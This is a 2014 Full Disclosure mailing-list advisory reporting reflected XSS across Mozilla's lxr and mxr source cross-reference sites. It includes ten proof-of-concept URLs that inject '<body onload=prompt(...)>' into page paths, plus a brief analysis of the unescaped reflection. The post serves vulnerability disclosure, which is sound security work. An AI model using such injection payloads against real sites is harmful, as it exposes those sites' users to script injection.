
Date: Mon, 20 Oct 2014 13:51:40 +0800
From: Jing Wang <justqdjing@...il.com>
To: fulldisclosure@...lists.org
Subject: [FD] Mozilla mozilla.org Two Sub-Domains ( Cross Reference) XSS
 Vulnerability ( All URLs Under the Two Domains)

Domains:
http://lxr.mozilla.org/
http://mxr.mozilla.org/
(The two domains above are almost the same)




Websites information:
lxr.mozilla.org, mxr.mozilla.org are cross references designed to display
the Mozilla source code. The sources displayed are those that are currently
checked in to the mainline of the mozilla.org CVS server, Mercurial Server,
and Subversion Server; these pages are updated many times a day, so they
should be pretty close to the latest‑and‑greatest. (from Mozilla)




Vulnerability description:
All pages under the following two URLs are vulnerable.
http://lxr.mozilla.org/mozilla-central/source
http://mxr.mozilla.org/mozilla-central/source


This means all URLs under the above two domains can be used for XSS attacks
targeting Mozilla's users.

Since there are large number of pages under them. Meanwhile, the contents
of the two domains vary. This makes the vulnerability very dangerous.
Attackers can use different URLs to design XSS attacks to Mozilla's variety
class of users.

The vulnerability have been reported to bugzilla.mozilla.org. Mozilla are
dealing with this issue.




POCs:
http://lxr.mozilla.org/mozilla-central/source/<body
onload=prompt("justqdjing")>
http://lxr.mozilla.org/mozilla-central/source/mobile/android/<body
onload=prompt("justqdjing")>
http://lxr.mozilla.org/mozilla-central/source/Android.mk/<body
onload=prompt("tetraph")>
http://lxr.mozilla.org/mozilla-central/source/storage/public/mozIStorageBindingParamsArray.idl/<body
onload=prompt("tetraph")>
http://lxr.mozilla.org/mozilla-central/source/netwerk/protocol/device/AndroidCaptureProvider.cpp<body
onload=prompt("tetraph")>


http://mxr.mozilla.org/mozilla-central/source/<body
onload=prompt("justqdjing")>
http://mxr.mozilla.org/mozilla-central/source/webapprt/<body
onload=prompt("justqdjing")>
http://mxr.mozilla.org/mozilla-central/source/mozilla-config.h.in/<body
onload=prompt("justqdjing")>
http://mxr.mozilla.org/mozilla-central/source/chrome/nsChromeProtocolHandler.h/<body
onload=prompt("tetraph")>
http://mxr.mozilla.org/mozilla-central/source/security/sandbox/linux/x86_32_linux_syscalls.h/<body
onload=prompt("tetraph")>




POC Video:
https://www.youtube.com/user/tetraph




Vulnerability Analysis:
Take the following link as an example,
http://lxr.mozilla.org/mozilla-central/source/chrome/<attacktest>

We can see that for the page reflected, it contains the following codes.
<a href="/mozilla-central/source/chrome/%253Cattacktest%253E">
<attacktest></attacktest>
</a>

If we insert "<body onload=prompt("justqdjing")>" into the URL, the code
can be executed.




The vulnerability can be attacked without user login. My tests were
performed on Firefox (26.0) in Ubuntu (12.04) and IE (9.0.15) in Windows 7.


Cross-site scripting (XSS) is a type of computer security vulnerability
typically found in Web applications. XSS enables attackers to inject
client-side script into Web pages viewed by other users. A cross-site
scripting vulnerability may be used by attackers to bypass access controls
such as the same origin policy. (From Wikipedia)




Posted By:
Wang Jing, mathematics student from Nanyang Technological University,
Singapore.
http://tetraph.com/wangjing/




More Details:
http://www.tetraph.com/blog/xss-vulnerability/mozilla-mozilla-org-two-sub-domains-cross-reference-xss-vulnerability-all-urls-under-the-two-domains/
http://lxr.mozilla.org/mozilla-central/source
http://mxr.mozilla.org/mozilla-central/source

_______________________________________________
Sent through the Full Disclosure mailing list
http://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/